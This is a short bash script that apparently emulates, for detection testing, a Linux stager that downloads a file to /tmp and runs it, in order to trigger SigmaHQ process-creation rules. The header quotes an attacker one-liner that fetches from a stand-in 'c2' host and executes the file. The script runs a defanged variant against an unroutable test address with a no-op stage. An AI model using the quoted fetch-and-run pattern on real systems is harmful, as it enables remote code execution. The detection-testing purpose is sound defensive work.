#!/usr/bin/env bash
# sigmahq_curl_wget_exec_tmp.sh - benign SigmaHQ emulation (see sigmahq_nohup.sh header).
#
# What an attacker does: a fileless stager that downloads a script into /tmp (or
# /dev/shm) and immediately runs it, e.g. `sh -c "curl http://c2/x -o /tmp/x; sh
# /tmp/x"` (T1059.004/T1203). The rule keys on one command line that carries a
# downloader path ('/curl' or '/wget'), a temp path ('/tmp/' or '/dev/shm/') and
# 'sh -c' together. Harmless analogue: the same one-liner, but curl targets a
# TEST-NET-1 address (192.0.2.1, RFC 5737, unroutable) with a 1s timeout so no
# file is ever fetched, and the second stage is a bare `sh -c true` no-op. The
# execve carrying the curl path, '/tmp/' and 'sh -c', which the rule keys on, is
# real. curl_usage (any curl) genuinely fires alongside - a legit twin.
#
# Imitates (SigmaHQ): proc_creation_lnx_curl_wget_exec_tmp.yml - ATT&CK T1059.004
# Expected rules: proc_creation_lnx_curl_wget_exec_tmp, proc_creation_lnx_curl_usage
set -u

curlbin="$(type -P curl)"
[ -n "$curlbin" ] || { echo "BANKEN-EMUL-SKIP: no curl"; exit 0; }

# The full curl path (ends '/curl'), '/tmp/' and 'sh -c' all sit in this one
# command line; curl fails safe on the unroutable address and the stage is a no-op.
bash -c "$curlbin --connect-timeout 1 -o /tmp/bk-stage-$$ http://192.0.2.1/payload; sh -c true" >/dev/null 2>&1 || true
rm -f "/tmp/bk-stage-$$" 2>/dev/null || true

exit 0
